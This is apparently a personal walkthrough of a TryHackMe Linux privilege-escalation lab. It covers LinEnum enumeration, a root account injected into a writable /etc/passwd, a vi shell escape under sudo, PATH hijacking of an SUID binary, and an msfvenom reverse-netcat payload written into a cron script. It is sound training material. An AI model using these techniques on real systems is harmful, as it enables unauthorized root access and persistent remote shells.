# Task 2: Understanding Privesc - light over view of privilege escalation

## Main gist clearly stated in "Why is it important" section:

Rarely when doing a CTF or real-world penetration test, will you be able to gain a foothold (initial access) that affords you administrator access. Privilege escalation is crucial, because it lets you gain system administrator levels of access. This allow you to do many things, including:

	•  Reset passwords
	•  Bypass access controls to compromise protected data
	•  Edit software configurations
	•  Enable persistence, so you can access the machine again later.
	•  Change privilege of users



# Task3: light overview on Direction of Privilege escalation
Covers Vertical and Horizontal escalation.



# Task4: Enumeration

## What is LinEnum?
LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. It is important to understand what commands LinEnum executes, so that you are able to manually enumerate privesc vulnerabilities in a situation where you're unable to use LinEnum or other like scripts. In this room, we will explain what LinEnum is showing, and what commands can be used to replicate it.

It's worth noting that LinEnum is the earlier equivalent to the more modern and comprehensive linpeas, likewise windows has similar option called winpeas. LinEnum still has a few advantages over LinPEAS despite being older and less comprehensive. It produces cleaner, easier‑to‑read output with far less noise, making it ideal for quick checks or learning environments. It’s lightweight, faster, and safer to run on unstable or restricted systems where LinPEAS might be too aggressive. LinEnum is also easier to modify because it’s a simple Bash script, while LinPEAS is large and complex. 

## Where to get LinEnum
You can download a local copy of LinEnum from:
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Can download using: wget URL_HERE or curl -O URL_HERE to target PC may not work, you need to download to attackbox then setup a simple http server to transfer it across.

First off trying to download via wget/curl fails on TryHackMe targets, why is this?

Most THM Linux boxes block outbound HTTPS for security and realism.
GitHub raw URLs use HTTPS only, so the target can’t complete the TLS handshake.
That’s why you saw:

For curl:
…
  0     0    0     0    0     0      0      0 --:--:--  0:00:17 --:--:
  0     0    0     0    0     0      0      0 --:--:--  0:00:18 --:--:
--     0^C

For wget:
--2026-02-24 11:21:39--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... ^C

## Common reasons for this output:
	• Outbound HTTPS blocked
	• DNS restricted
	• No CA certificates installed
	• No IPv6 support
	• No GitHub access allowed
This is by design so you can’t just pull tools from the internet.

This is common for a docker or Kubernetes  container, this does not appear to be case here.

## Quick Summary: Identifying the Target Environment
### 1. Check PID 1 (fastest and most reliable single test)
Bash command:
ps -p 1 -o comm=

	• systemd or init → Full VM
	• bash, sh, python, tini → Docker/Podman
	• lxc-start / lxc-init → LXC

This works because containers rarely run a real init system.

### 2. Check cgroups (container fingerprints)
Bash command:
cat /proc/1/cgroup

Look for:
	• docker
	• containerd
	• kubepods
	• libpod

If none appear → Not Docker/Podman/K8s.

### 3. Check root filesystem type
Bash command:
df -h /

	• overlay → Docker/Podman
	• /dev/sda1, /dev/vda1, /dev/xvda1 → VM
	• rootfs only → chroot or minimal container

### 4. Check for hypervisor signatures (VM only)
Bash command:
dmesg | grep -i hypervisor

or:

Bash command:
grep -i hypervisor /proc/cpuinfo

Typical VM indicators:
	• Hypervisor detected: KVM
	• Hypervisor vendor: VMware
	• Hypervisor vendor: Microsoft


Containers never show this because they share the host kernel.

In this case of user3 for instance and running:
grep -i hypervisor /proc/cpuinfo
Contained:
... rdrand hypervisor lahf_lm ...
The presence of the hypervisor CPU flag is a smoking‑gun indicator that the kernel is running under a virtual machine hypervisor.
Containers never show this flag because they share the host kernel. Only VMs have this. So your target is 100% a VM, not Docker, not LXC, not Podman, not chroot.


## How do I get LinEnum on the target machine?
There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using "python3 -m http.server 8000" [1]. Then using "wget" on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command "chmod +x FILENAME.sh".

Other Methods
In case you're unable to transport the file, you can also, if you have sufficient permissions, copy the raw LinEnum code from your local machine [1] and paste it into a new file on the target, using Vi or Nano [2]. Once you've done this, you can save the file with the ".sh" extension. Then make the file executable using the command "chmod +x FILENAME.sh". You now have now made your own executable copy of the LinEnum script on the target machine!

Running LinEnum
LinEnum can be run the same way you run any bash script, go to the directory where LinEnum is and run the command "./LinEnum.sh".
Understanding LinEnum Output
The LinEnum output is broken down into different sections, these are the main sections that we will focus on:
Kernel Kernel information is shown here. There is most likely a kernel exploit available for this machine.
Can we read/write sensitive files: The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.
SUID Files: The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges. 
Crontab Contents: The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.
There's also a lot of other useful information contained in this scan. Lets have a read!

## Questions don’t include linenum related info so let's look into it now.
Install with on target host:
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh



# Task 4 Questions associated with CTF:

First, lets SSH into the target machine, using the credentials  user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

All answers can be found in the LinEnum output when run on target. 
Just make sure to chmod +x LinEnum.sh before running it.

## What is the target's hostname?
Hostname section shows polobox

Answer: polobox

## Look at the output of /etc/passwd how many "user[x]" are there on the system?
View file with cat and use grep user. This will show any line with that case sensitive combo. 

Answer is 8.

## How many available shells are there on the system?
You can just scroll down to passwd file section or copy that section just to use cut command as it just good to use it from time to time.

Use the cut command: 

By seperating out the password section provides flimsy excuse to use the cut command to filter out shell sections: entirely unnecessary but something I don’t do enough.
$ cut -d: -f7 enum_passwd_section.txt | uniq -c | sort -n
      1 /bin/bash
      1 /bin/false
      1 /bin/sync
      1 /usr/sbin/nologin
      1 /usr/sbin/nologin
      2 /usr/sbin/nologin
      3 /usr/sbin/nologin
      4 /bin/bash
      5 /bin/bash
     12 /usr/sbin/nologin
     19 /bin/false

Uniq -c was a terrible choise, the reason is it counts the combos of each but if not sorted and others appear in between you get 1, 4 then 5 when it should have been 10. Sort -u is better here and better sifts shells types and removes duplicates. 

cut -d: -f7 enum_passwd_section.txt | sort -u
/bin/bash
/bin/false
/bin/sync
/usr/sbin/nologin

Answer: 4 

## What is the name of the bash script that is set to run every 5 minutes by cron?
Crontab section shows in top line for */5 for 5minutes

Answer: autoscript.sh

## What critical file has had its permissions changed to allow some users to write to it? 
Hint points to password file, Its not the shadow file that has -rw -r- ---, only passwd has write for others.
Both passwd and shadow are next to each other under interesting files section from LinEnum.

^[[00;31m[-] Can we read/write sensitive files:^[[00m
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
-rw-r--r-- 1 root root 1087 Jun  5  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 2359 Mar  6  2020 /etc/shadow

But same can be found locally as usual using:

$ ls -la /etc/passwd
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd

Answer: /etc/passwd



# Task 5 Abusing SUID/GUID Files

## Finding and Exploiting SUID Files
The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
What is an SUID binary?
As usual use chmod to change read write and execute as can be seen using ls -la command (rwx-rwx-rwx). Work by simple binary addition etc. 7, which is a combination of read (4) write (2) and execute (1) operation. 

But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).
Therefore, the permissions to look for when looking for SUID is:
SUID:
rws-rwx-rwx
GUID:
rwx-rws-rwx

Finding SUID Binaries

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: "find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files. Let's break down this command.
find - Initiates the "find" command
/ - Searches the whole file system
-perm - searches for files with specific permissions
-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
-type f - Only search for files
2>/dev/null - Suppresses errors

user3@polobox:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
…
Several lines later
…
/home/user5/script
/home/user3/shell
user3@polobox:~$ 
Here in user3 account "shell" file runs with root access level same with "script" for user5.


## Task 6 Exploiting a Writable /etc/passwd

## 1. Why this matters
The file /etc/passwd stores essential user account information used during login — username, UID, GID, home directory, and shell. It is normally:
	• Readable by everyone (needed for system utilities)
	• Writable ONLY by root
If a normal user can write to it, that’s a serious privilege‑escalation vulnerability.

## 2. What was discovered
During enumeration:
	• The user user7 belongs to the root group (GID 0)
	• /etc/passwd is writable by this user
This means user7 can directly modify the system’s account database.

## 3. How /etc/passwdis structured
Each line represents one user account, with seven colon‑separated fields:
Code

username:password_hash:UID:GID:comment:home_directory:shell
Example:
Code

test:x:0:0:root:/root:/bin/bash
Key points:
	• x means the real password hash is stored in /etc/shadow
	• UID 0 = root privileges
	• GID 0 = root group
	• The shell is usually /bin/bash

## 4. How the exploit works
If /etc/passwd is writable, you can:
	1. Generate your own password hash (e.g., using openssl passwd -1)
	2. Add a new line to /etc/passwd with:
		○ Your chosen username
		○ Your generated hash
		○ UID 0 and GID 0
		○ A valid shell
This effectively creates a new root user that you control.

Example malicious entry:

new:$1$new$HASHVALUE:0:0:root:/root:/bin/bash

Once added, you can log in as new, and you have full root access.

## 5. Bottom line
Writable /etc/passwd = instant root compromise. Any user who can edit it can create a fully privileged account.


## Questions in this section merely show su user7 escalation path then create a new user named "new" with salt "new" and password "123"

Using 
root@polobox:/home/user7# openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

Then use the right form and add to the passwd file:

Answer: new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash


# Task 7 Escaping Vi Editor

## The page you’re on is walking you through a privilege‑escalation concept:
how misconfigured sudo permissions can allow a user to run a program (like vi) with elevated privileges.

This re-introduces us to sudo list command: sudo -l

This wont initially work for user3 but user8 has access to sudo command:

user3@polobox:~$ sudo -l
[sudo] password for user3: 
Sorry, user user3 may not run sudo on polobox.
user3@polobox:~$ su user8
Password: 
Welcome to Linux Lite 4.4 user8
 
Monday 23 February 2026, 11:57:58
Memory Usage: 347/1991MB (17.43%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:/home/user3$ 

This lists what commands that user can run with elevated privileges.
Here, the user can run vi as root without a password.
The page shows this as:

The user requires NOPASSWD to run vi as root .

So if a user can run vi with elevated privileges, they can access features that normally require higher permissions.

From here just load sudo vi to gain root access to vi and to gain root shell simply try :!sh

This will open a root level shell

The TryHackMe page explains that this is why vi appears on GTFOBins, which is a site documenting how certain Unix binaries behave when misconfigured.

The page describes GTFOBins as:

“a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions” .


# Task 8Exploiting Crontab

This time user4 has a file autoscript.sh that is used with crontab.

Exit to host user account out of user8 Account from previous question. 


Create the payload using msfvenom:
Create a payload using: msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
Output should resemble:
mkfifo … 2 lines should be here, not included, upsets norton.

This is copied and autoscript.sh file in user4, which crontab accesses to create a reverse shell. Use find to locate it:

user4@polobox:/home/user3/Desktop$ find / -type f -iname "autoscript.sh" 2>/dev/null

/home/user4/Desktop/autoscript.sh

Echo [MSFVENOM PAYLOAD] > /home/user4/Desktop/autoscript.sh

Effectively the script should run when the crontab calls it. But requires nv -lnvp 8888 on host to connect to it. Can work also if nc setup then run payload on user4, but defeats the purpose of allowing crontab run it in persistent fashion. 

# TASK 9 Exploiting PATH Variable

How PATH Can Be Used for Privilege Escalation
	• PATH is an environment variable that tells the shell where to look for executable programs when you type a command.
	• You can view it with:
bash

echo $PATH
	• If a SUID binary (owned by root) runs a command like ps or ls without using an absolute path, it relies on the PATH variable to find that command.
	• If you can change the PATH, you can make the SUID program run your malicious version of the command instead of the real one.
	• Because the SUID binary runs with the privileges of its owner, your fake command executes with root privileges, giving you full control.

Questions: start with changing using su user5 to user5 then accessing script file from the /home/user5 directory.


Jump to user5 shell with "su" command

user3@polobox:~$ su user5
Password: 
Welcome to Linux Lite 4.4 user5

User5 bash shell starts this is important as its what we see when "/bin/bash" is assigned to ls in "/tmp" directory further on.
 
Sunday 01 March 2026, 12:10:27
Memory Usage: 347/1991MB (17.43%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
Check this file script we are told is in /home/user5 directory surely enough its got suid bit set and is owned by the root user and group.
user5@polobox:~$ ls -la script
-rwsr-xr-x 1 root root 8392 Jun  4  2019 script
user5@polobox:~$ 

## Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

Running shows similar result running ls

user5@polobox:~$ ./script
Desktop    Downloads  Pictures	script	   Videos
Documents  Music      Public	Templates
user5@polobox:~$

Answer: ls 


## Next is an example using the common directory /tmp ls used as a name for command and echo is used to store /bin/bash to that variable.


echo “[whatever command we want to run]” > [name of the executable we’re imitating]

echo “/bin/bash” > ls

The point here is that this script can be edited to run any script we want with root privilege since all we need to do is get this to run command when its called.

Ls not executable yet the original one works until chmod +x used  but shows new ls is just a file.
user5@polobox:/tmp$ ls
ls
…several lines later
timesyncd.service-fxiTk6
vboxguest-Module.symvers

## Great! Now we’ve made our imitation, we need to make it an executable. What command do we execute to do this?
chmod +x ls

Immediately we can run ls instead of list files or directories it loads the bash shell that we got when su user5 was used to jump to user5 user account.

Adds the directory containing new ls to PATH so it will run when script is run. But can run is ls called.
user5@polobox:/tmp$ export PATH=/tmp:$PATH

View /tmp appended to start of $PATH variable
user5@polobox:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Try just call ls, this will only work in current shell while in it.
user5@polobox:/tmp$ ls 
Welcome to Linux Lite 4.4 user5
 
Sunday 01 March 2026, 12:17:18
Memory Usage: 335/1991MB (16.83%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
Its actually now shell in shell
user5@polobox:/tmp$ exit
exit

Back to user5 original shell
user5@polobox:/tmp$ exit
exit

Second exit gets back to user3. 

Exiting the shell resets the PATH variable because environment variables live only inside the shell process that created them. When that process ends, its entire environment disappears with it. PATH will be its default value again if you enter again. The common directory is not affected so ls you created is still present for all accounts. 

user3@polobox:~$ ls
Desktop    Downloads  Pictures  shell      Videos
Documents  Music      Public    Templates

Alternatively just remove the /tmp:section from the PATH variable and store it

What we had before:
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Restore assuming you don’t want to leave the user5 shell:
user5@polobox:/tmp$ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
user5@polobox:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
user5@polobox:/tmp$ 


Here ls operates in user3 context as permissions linked with user5 for change made.


If we go back to /home/user5 after changing $PATH variable shell is called instead of ls command:
user5@polobox:/home$ cd /home/user5
user5@polobox:~$ script
Script started, file is typescript
Welcome to Linux Lite 4.4 user5
 
Monday 02 March 2026, 11:28:25
Memory Usage: 343/1991MB (17.23%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:~$ 

# TASK 10 Expanding knowledge 

Further Learning
There is never a "magic" answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges.The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven't missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.
Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.
	• https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
	• https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	• https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
	• https://payatu.com/blog/a-guide-to-linux-privilege-escalation/ 


